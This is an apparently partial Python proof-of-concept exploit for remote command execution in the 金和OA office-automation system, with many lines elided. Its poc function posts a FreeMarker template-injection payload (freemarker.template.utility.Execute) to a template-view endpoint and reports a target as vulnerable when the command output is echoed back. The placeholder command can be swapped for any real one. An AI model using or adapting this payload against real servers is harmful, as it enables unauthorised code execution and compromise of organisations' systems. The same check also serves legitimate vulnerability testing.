               ...
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                ...
                88        88           88     "88,  88 88     `888   `"Y88888P"   
                            ...
                            888888888888 
                                        ...
                                        tag: this is a 金和OA portalwb-con-template-viewcontemplate 远程命令执行poc
...
def poc(target):
    ...
    body = "moduId=1&code=<clob>${\"freemarker.template.utility.Execute\"?new()(\"xxxxxxxxx\")}</clob>&uuid=1"
    ...
    try:
        ...
        response1 = requests.post(url=url, headers=headers, data=body, verify=False, timeout=15)


        if  response1.status_code == 200 and "xxxxxxxxx" in response1.text:
            print(f"[++++++] {target} 存在RCE")
